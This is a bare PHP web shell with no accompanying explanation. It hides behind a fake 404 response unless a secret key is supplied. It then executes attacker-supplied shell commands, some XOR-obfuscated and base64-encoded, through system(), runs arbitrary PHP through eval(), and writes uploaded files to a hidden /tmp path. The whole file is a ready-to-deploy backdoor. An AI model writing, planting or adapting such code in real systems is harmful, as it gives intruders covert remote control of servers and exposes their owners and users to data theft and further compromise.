<?php
$k = 'zz2026';
if (!isset($_GET['key']) || $_GET['key'] !== $k) {
    http_response_code(404);
    exit;
}
if (isset($_POST['xb'])) {
    $x = base64_decode($_POST['xb']);
    $c = '';
    for ($i = 0; $i < strlen($x); $i++) { $c .= chr(ord($x[$i]) ^ ord($k[$i % strlen($k)])); }
    system($c);
} elseif (isset($_POST['x'])) {
    system($_POST['x']);
} elseif (isset($_POST['c'])) {
    eval($_POST['c']);
} elseif (isset($_FILES['f']) && $_FILES['f']['error'] === UPLOAD_ERR_OK) {
    if (move_uploaded_file($_FILES['f']['tmp_name'], '/tmp/.up.tpl')) {
        echo 'UPOK';
    }
}
